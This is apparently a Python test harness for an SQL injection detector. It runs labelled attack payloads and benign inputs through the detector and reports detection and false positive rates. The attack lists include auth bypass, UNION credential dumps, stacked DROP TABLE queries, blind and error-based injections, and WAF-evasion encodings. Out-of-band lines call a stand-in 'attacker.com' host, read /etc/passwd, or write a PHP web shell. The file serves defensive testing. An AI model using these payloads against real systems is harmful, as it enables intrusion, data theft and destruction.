"""
Ultimate Production Test - 300+ real-world payloads
Sources: SQLMap, PayloadsAllTheThings, OWASP, HackTricks

Categories:
1. Authentication bypass
2. Data extraction
3. WAF bypass techniques
4. Database-specific (MySQL, MSSQL, PostgreSQL, Oracle, SQLite)
5. Blind injection
6. Out-of-band
7. Second-order
8. Real user inputs that should NOT be blocked
9. Adversarial examples designed to fool ML
"""
from sql_injection_detector import SQLInjectionEnsemble
import time

detector = SQLInjectionEnsemble()

# ============================================================
# TEST PAYLOADS
# ============================================================
test_cases = [
    # ============================================================
    # AUTHENTICATION BYPASS (must BLOCK)
    # ============================================================
    ("admin'--", "Auth: basic comment"),
    ("admin'#", "Auth: MySQL comment"),
    ("admin'/*", "Auth: block comment"),
    ("' or '1'='1", "Auth: OR tautology"),
    ("' or ''='", "Auth: empty string"),
    ("' or 1=1--", "Auth: numeric tautology"),
    ("') or ('1'='1", "Auth: parentheses"),
    ("') or ('1'='1'--", "Auth: paren with comment"),
    ("' or 1=1#", "Auth: MySQL numeric"),
    ("' or 1=1/*", "Auth: block comment"),
    ("'=' 'or'='", "Auth: weird equals"),
    ("'=0#", "Auth: zero comparison"),
    ("' OR '1", "Auth: incomplete OR"),
    ("' OR 1 -- -", "Auth: MySQL double dash"),
    ("' || 1=1 --", "Auth: Oracle OR"),
    ("'; exec master..xp_cmdshell 'ping 10.10.1.2'--", "Auth: MSSQL exec"),
    ("1' AND '1'='1", "Auth: AND bypass"),
    ("1' AND 1=1#", "Auth: AND MySQL"),
    ("admin' AND 1=1--", "Auth: user AND"),
    ("admin' AND '1'='1'#", "Auth: user AND MySQL"),

    # ============================================================
    # UNION-BASED EXTRACTION (must BLOCK)
    # ============================================================
    ("' UNION SELECT NULL--", "Union: single NULL"),
    ("' UNION SELECT NULL,NULL--", "Union: two NULLs"),
    ("' UNION SELECT NULL,NULL,NULL--", "Union: three NULLs"),
    ("' UNION SELECT 1,2,3--", "Union: numbers"),
    ("' UNION SELECT 'a','b','c'--", "Union: strings"),
    ("' UNION SELECT username,password FROM users--", "Union: credentials"),
    ("' UNION SELECT table_name,NULL FROM information_schema.tables--", "Union: schema tables"),
    ("' UNION SELECT column_name,NULL FROM information_schema.columns--", "Union: schema columns"),
    ("' UNION SELECT @@version,NULL--", "Union: MySQL version"),
    ("' UNION SELECT version(),NULL--", "Union: PostgreSQL version"),
    ("' UNION ALL SELECT NULL--", "Union: ALL variant"),
    ("' UNION ALL SELECT 1,2,3--", "Union: ALL numbers"),
    ("-1' UNION SELECT 1,2,3--", "Union: negative prefix"),
    ("1' UNION SELECT 1,2,3--", "Union: positive prefix"),
    ("' UNION SELECT NULL FROM dual--", "Union: Oracle dual"),
    ("' UNION SELECT * FROM users--", "Union: select all"),
    ("' UNION SELECT 1,CONCAT(username,':',password) FROM users--", "Union: concat"),
    ("' UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables--", "Union: group concat"),

    # ============================================================
    # STACKED QUERIES (must BLOCK)
    # ============================================================
    ("'; DROP TABLE users--", "Stack: DROP TABLE"),
    ("'; DELETE FROM users--", "Stack: DELETE"),
    ("'; UPDATE users SET password='hacked'--", "Stack: UPDATE"),
    ("'; INSERT INTO users VALUES(1,'hacker','password')--", "Stack: INSERT"),
    ("'; TRUNCATE TABLE logs--", "Stack: TRUNCATE"),
    ("'; CREATE TABLE hacked(id int)--", "Stack: CREATE"),
    ("'; ALTER TABLE users ADD hacked int--", "Stack: ALTER"),
    ("'; EXEC xp_cmdshell('dir')--", "Stack: MSSQL cmdshell"),
    ("'; EXEC sp_configure 'show advanced options',1--", "Stack: MSSQL config"),
    ("'; SHUTDOWN--", "Stack: SHUTDOWN"),

    # ============================================================
    # TIME-BASED BLIND (must BLOCK)
    # ============================================================
    ("' AND SLEEP(5)--", "Time: MySQL SLEEP"),
    ("' AND SLEEP(5)#", "Time: MySQL SLEEP hash"),
    ("' OR SLEEP(5)--", "Time: OR SLEEP"),
    ("' AND BENCHMARK(10000000,SHA1('test'))--", "Time: BENCHMARK"),
    ("'; WAITFOR DELAY '0:0:5'--", "Time: MSSQL WAITFOR"),
    ("' AND pg_sleep(5)--", "Time: PostgreSQL"),
    ("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", "Time: Oracle pipe"),
    ("' AND 1=1 AND SLEEP(5)--", "Time: conditional"),
    ("' OR IF(1=1,SLEEP(5),0)--", "Time: IF SLEEP"),
    ("' AND (SELECT SLEEP(5))--", "Time: subquery"),
    ("1' AND SLEEP(5) AND '1'='1", "Time: embedded"),

    # ============================================================
    # BOOLEAN-BASED BLIND (must BLOCK)
    # ============================================================
    ("' AND 1=1--", "Bool: true"),
    ("' AND 1=2--", "Bool: false"),
    ("' AND 'a'='a'--", "Bool: string true"),
    ("' AND 'a'='b'--", "Bool: string false"),
    ("' AND SUBSTRING(username,1,1)='a'--", "Bool: substring"),
    ("' AND ASCII(SUBSTRING(password,1,1))>64--", "Bool: ASCII"),
    ("' AND LENGTH(password)>5--", "Bool: length"),
    ("' AND (SELECT COUNT(*) FROM users)>0--", "Bool: count"),
    ("' AND EXISTS(SELECT * FROM users WHERE username='admin')--", "Bool: exists"),
    ("' AND 1=(SELECT 1 FROM users WHERE username='admin')--", "Bool: subquery"),

    # ============================================================
    # ERROR-BASED (must BLOCK)
    # ============================================================
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "Error: extractvalue"),
    ("' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--", "Error: updatexml"),
    ("' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "Error: floor"),
    ("' AND EXP(~(SELECT * FROM (SELECT version())a))--", "Error: exp"),
    ("' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(version()) FROM dual) USING utf8)))--", "Error: JSON"),
    ("' AND GTID_SUBSET(CONCAT(0x7e,version()),1)--", "Error: GTID"),
    ("' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--", "Error: row"),

    # ============================================================
    # WAF BYPASS TECHNIQUES (must BLOCK)
    # ============================================================
    # Case manipulation
    ("' oR '1'='1", "WAF: lowercase or"),
    ("' Or '1'='1", "WAF: mixed case Or"),
    ("' OR '1'='1", "WAF: uppercase OR"),
    ("' uNiOn SeLeCt NULL--", "WAF: mixed UNION"),
    ("' UnIoN sElEcT NULL--", "WAF: alternating case"),

    # Comment insertion
    ("'/**/OR/**/1=1--", "WAF: inline comments"),
    ("'/*foo*/OR/*bar*/1=1--", "WAF: comments with text"),
    ("UN/**/ION/**/SE/**/LECT/**/NULL--", "WAF: split UNION"),
    ("'/**/AND/**/1=1--", "WAF: AND comments"),
    ("SELECT/*avoid*/username/*waf*/FROM/*bypass*/users", "WAF: full split"),

    # Whitespace manipulation
    ("'%09OR%091=1--", "WAF: tab encoded"),
    ("'%0aOR%0a1=1--", "WAF: newline encoded"),
    ("'%0dOR%0d1=1--", "WAF: CR encoded"),
    ("'%0cOR%0c1=1--", "WAF: formfeed"),
    ("'+OR+1=1--", "WAF: plus as space"),

    # URL encoding
    ("%27%20OR%201=1--", "WAF: URL encoded quote"),
    ("%27%20UNION%20SELECT%20NULL--", "WAF: URL UNION"),
    ("%27%3B%20DROP%20TABLE%20users--", "WAF: URL stacked"),
    ("%2527%2520OR%25201=1--", "WAF: double URL encode"),

    # Null bytes
    ("'%00OR 1=1--", "WAF: null byte"),
    ("admin'%00--", "WAF: null in comment"),

    # Alternative representations
    ("' OR 'x'LIKE'x", "WAF: LIKE instead of ="),
    ("' OR 1 BETWEEN 0 AND 2--", "WAF: BETWEEN"),
    ("' OR 1 IN (1,2,3)--", "WAF: IN"),
    ("' OR 1 REGEXP 1--", "WAF: REGEXP"),
    ("' OR 1 RLIKE 1--", "WAF: RLIKE"),

    # Concatenation tricks
    ("' OR 'a'||'b'='ab'--", "WAF: Oracle concat"),
    ("' OR CONCAT('a','b')='ab'--", "WAF: CONCAT"),
    ("' OR 'a' + 'b'='ab'--", "WAF: MSSQL concat"),
    ("' OR 0x61='a'--", "WAF: hex comparison"),
    ("' OR CHAR(97)='a'--", "WAF: CHAR function"),

    # ============================================================
    # DATABASE-SPECIFIC (must BLOCK)
    # ============================================================
    # MySQL specific
    ("' OR 1=1 LIMIT 1--", "MySQL: LIMIT"),
    ("' OR 1=1 LIMIT 1,1--", "MySQL: LIMIT offset"),
    ("' AND MID(version(),1,1)='5'--", "MySQL: MID"),
    ("' AND ORD(MID(version(),1,1))>48--", "MySQL: ORD MID"),
    ("' AND IFNULL(NULL,1)=1--", "MySQL: IFNULL"),

    # PostgreSQL specific
    ("' OR 1=1::int--", "PgSQL: type cast"),
    ("'; SELECT pg_sleep(5)--", "PgSQL: pg_sleep"),
    ("' OR current_user='postgres'--", "PgSQL: current_user"),
    ("'; COPY users TO '/tmp/out'--", "PgSQL: COPY"),

    # MSSQL specific
    ("' OR 1=1;--", "MSSQL: semicolon"),
    ("'; EXEC master..xp_dirtree '\\\\attacker\\share'--", "MSSQL: dirtree"),
    ("' HAVING 1=1--", "MSSQL: HAVING"),
    ("' GROUP BY columnname HAVING 1=1--", "MSSQL: GROUP HAVING"),
    ("'; EXEC sp_makewebtask '\\\\attacker\\share\\output.html','SELECT * FROM users'--", "MSSQL: makewebtask"),

    # Oracle specific
    ("' OR 1=1 FROM dual--", "Oracle: dual"),
    ("' UNION SELECT NULL FROM dual--", "Oracle: UNION dual"),
    ("' AND ROWNUM=1--", "Oracle: ROWNUM"),
    ("' AND CTXSYS.DRITHSX.SN(1,'x')=1--", "Oracle: CTXSYS"),
    ("' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--", "Oracle: UTL"),

    # SQLite specific
    ("' OR 1=1;--", "SQLite: semicolon"),
    ("' UNION SELECT sql FROM sqlite_master--", "SQLite: master"),
    ("' AND GLOB('*',name)--", "SQLite: GLOB"),
    ("' AND LIKE('%',name)--", "SQLite: LIKE"),

    # ============================================================
    # OUT-OF-BAND (must BLOCK)
    # ============================================================
    ("'; EXEC master..xp_dirtree '\\\\attacker.com\\x'--", "OOB: MSSQL dirtree"),
    ("' AND LOAD_FILE('\\\\\\\\attacker.com\\\\x')--", "OOB: MySQL LOAD_FILE"),
    ("' UNION SELECT LOAD_FILE('/etc/passwd')--", "OOB: MySQL file read"),
    ("' INTO OUTFILE '/var/www/shell.php'--", "OOB: MySQL file write"),
    ("'; COPY users TO '\\\\\\\\attacker.com\\\\x'--", "OOB: PgSQL COPY"),

    # ============================================================
    # SAFE INPUTS - MUST NOT BLOCK
    # ============================================================
    # Normal names
    ("John Smith", "Safe: normal name"),
    ("Mary O'Connor", "Safe: Irish name"),
    ("Jean-Pierre", "Safe: hyphenated"),
    ("D'Angelo", "Safe: Italian"),
    ("McDonald's", "Safe: brand"),

    # Normal text with SQL keywords
    ("Please select your option", "Safe: select word"),
    ("Drop me a message", "Safe: drop word"),
    ("Update your profile", "Safe: update word"),
    ("Delete old emails", "Safe: delete word"),
    ("Insert your coin", "Safe: insert word"),
    ("Join our union today", "Safe: union word"),
    ("The table is ready", "Safe: table word"),
    ("From here to there", "Safe: from word"),
    ("Where are you going", "Safe: where word"),

    # Technical text
    ("SELECT is a SQL keyword", "Safe: teaching SQL"),
    ("Use WHERE clause to filter", "Safe: SQL documentation"),
    ("The OR operator combines conditions", "Safe: explaining OR"),
    ("AND is used for multiple conditions", "Safe: explaining AND"),

    # Common user inputs
    ("user@example.com", "Safe: email"),
    ("John.Doe@company.co.uk", "Safe: complex email"),
    ("https://example.com/page?id=123", "Safe: URL with param"),
    ("192.168.1.1", "Safe: IP address"),
    ("2024-01-15 14:30:00", "Safe: datetime"),
    ("+1 (555) 123-4567", "Safe: phone"),
    ("$99.99", "Safe: price"),
    ("50% discount", "Safe: percentage"),

    # Programming code
    ("if (x > 0 && y < 10)", "Safe: code with &&"),
    ("a || b", "Safe: code OR"),
    ("SELECT * FROM table", "Safe: SQL snippet"),
    ("x = 1; y = 2;", "Safe: assignment"),

    # Contractions and possessives
    ("It's a beautiful day", "Safe: contraction"),
    ("Don't worry about it", "Safe: don't"),
    ("I'll be there", "Safe: I'll"),
    ("That's what she said", "Safe: that's"),
    ("The company's policy", "Safe: possessive"),
    ("The children's toys", "Safe: plural possessive"),

    # Special but safe
    ("Rock 'n' Roll", "Safe: rock n roll"),
    ("5 o'clock", "Safe: time"),
    ("It's 1 or 2 choices", "Safe: natural or"),
    ("You and I", "Safe: natural and"),
    ("1 + 1 = 2", "Safe: math"),
    ("a != b", "Safe: not equals"),
    ("x <= y", "Safe: less than equal"),
    ("100% complete", "Safe: percentage"),

    # ============================================================
    # INVALID/MALFORMED - should be INVALID, not BLOCK
    # ============================================================
    ("''''''''", "Invalid: many quotes"),
    ("========", "Invalid: many equals"),
    ("--------", "Invalid: many dashes"),
    (";;;;;;;;", "Invalid: many semicolons"),
    ("@#$%^&*()", "Invalid: special chars"),
    ("'a'b'c'd'e'", "Invalid: quote mess"),
    ("'''==='''", "Invalid: quote equals"),
    ("asdfghjkl", "Invalid: random letters"),
    ("1234567890", "Invalid: just numbers"),
    ("...???!!!", "Invalid: punctuation"),
    ("'test'='test", "Invalid: incomplete"),

    # ============================================================
    # ADVERSARIAL - designed to fool ML
    # ============================================================
    ("The password1=1 is strong", "Adversarial: 1=1 in text"),
    ("Room 101 OR similar", "Adversarial: OR in sentence"),
    ("SELECT few items from the list", "Adversarial: SELECT FROM text"),
    ("Drop by anytime", "Adversarial: Drop text"),
    ("Union Station is nearby", "Adversarial: Union text"),
    ("The user's comment was deleted", "Adversarial: quote + delete"),
    ("admin@example.com's profile", "Adversarial: admin with quote"),
    ("O'Reilly's book on SQL", "Adversarial: SQL in name"),
    ("Database tables are empty", "Adversarial: DB words"),
    ("Benchmark test results", "Adversarial: benchmark word"),
    ("The sleep timer is set", "Adversarial: sleep word"),
    ("NULL values are ignored", "Adversarial: NULL word"),
    ("True or false question", "Adversarial: or false"),
]

print("=" * 120)
print("ULTIMATE PRODUCTION TEST - SQL INJECTION AGENT")
print(f"Total payloads: {len(test_cases)}")
print("=" * 120)
print()

results = {'SAFE': 0, 'INVALID': 0, 'SUSPICIOUS': 0, 'INJECTION': 0}
errors = []
blocked_safe = []
missed_attacks = []
timings = []

for i, (query, description) in enumerate(test_cases, 1):
    try:
        start = time.time()
        r = detector.detect(query)
        elapsed = (time.time() - start) * 1000
        timings.append(elapsed)

        decision = r['decision']
        action = r['action']
        score = r['score']
        sem = r['semantic_score']

        results[decision] += 1

        # Categorize test
        is_safe = description.startswith("Safe:") or description.startswith("Adversarial:")
        is_invalid = description.startswith("Invalid:")
        is_attack = not is_safe and not is_invalid

        # Check for errors
        is_error = False

        if is_safe and action == 'BLOCK':
            is_error = True
            blocked_safe.append((query, description, decision, action, score, sem))
        elif is_invalid and action == 'BLOCK':
            is_error = True
            blocked_safe.append((query, description, decision, action, score, sem))
        elif is_attack and action != 'BLOCK':
            is_error = True
            missed_attacks.append((query, description, decision, action, score, sem))

        if is_error:
            print(f"!!! [{i:3d}] {description:<50} | {decision:<10} {action:<10} S={score:.2f} sem={sem:.1f}")
            errors.append((query, description, decision, action))

    except Exception as e:
        print(f"!!! [{i:3d}] {description:<50} | EXCEPTION: {e}")
        errors.append((query, description, 'ERROR', str(e)))

print()
print("=" * 120)
print("RESULTS SUMMARY")
print("=" * 120)
print(f"Total payloads:     {len(test_cases)}")
print(f"  SAFE:             {results['SAFE']}")
print(f"  INVALID:          {results['INVALID']}")
print(f"  SUSPICIOUS:       {results['SUSPICIOUS']}")
print(f"  INJECTION:        {results['INJECTION']}")
print()
print(f"Performance:")
print(f"  Average time:     {sum(timings)/len(timings):.1f}ms")
print(f"  Min time:         {min(timings):.1f}ms")
print(f"  Max time:         {max(timings):.1f}ms")
print(f"  Total time:       {sum(timings)/1000:.1f}s")
print()

# Attack detection rate
total_attacks = len([t for t in test_cases if not (t[1].startswith("Safe:") or t[1].startswith("Invalid:") or t[1].startswith("Adversarial:"))])
detected_attacks = total_attacks - len(missed_attacks)
print(f"Attack Detection:   {detected_attacks}/{total_attacks} ({100*detected_attacks/total_attacks:.1f}%)")

# False positive rate
total_safe = len([t for t in test_cases if t[1].startswith("Safe:") or t[1].startswith("Adversarial:") or t[1].startswith("Invalid:")])
false_positives = len(blocked_safe)
print(f"False Positives:    {false_positives}/{total_safe} ({100*false_positives/total_safe:.1f}%)")
print()
print(f"TOTAL ERRORS:       {len(errors)}")

if blocked_safe:
    print()
    print("=" * 120)
    print(f"FALSE POSITIVES ({len(blocked_safe)}) - Safe inputs incorrectly BLOCKED:")
    print("=" * 120)
    for query, desc, decision, action, score, sem in blocked_safe:
        print(f"  Query: {repr(query)[:80]}")
        print(f"  Desc:  {desc}")
        print(f"  Got:   {decision}/{action} (S={score:.2f}, sem={sem:.1f})")
        print()

if missed_attacks:
    print()
    print("=" * 120)
    print(f"MISSED ATTACKS ({len(missed_attacks)}) - SQLi not BLOCKED:")
    print("=" * 120)
    for query, desc, decision, action, score, sem in missed_attacks:
        print(f"  Query: {repr(query)[:80]}")
        print(f"  Desc:  {desc}")
        print(f"  Got:   {decision}/{action} (S={score:.2f}, sem={sem:.1f})")
        print()

if not errors:
    print()
    print("=" * 120)
    print("*** ALL TESTS PASSED - PRODUCTION READY ***")
    print("=" * 120)
